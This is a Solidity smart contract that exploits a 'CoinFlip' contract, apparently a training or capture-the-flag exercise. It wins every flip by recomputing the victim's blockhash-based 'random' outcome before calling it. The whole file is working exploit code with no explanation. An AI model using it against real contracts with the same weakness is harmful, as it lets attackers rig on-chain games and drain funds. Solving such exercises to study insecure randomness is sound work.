
pragma solidity >=0.6.0 <0.9.0;
import "./3_CoinFlip.sol";

contract coinFlipAttack {
    CoinFlip public victimContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor (address _victimContract) {
        victimContract = CoinFlip(_victimContract);
    }

    function flip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1;

        victimContract.flip(side);
    }
}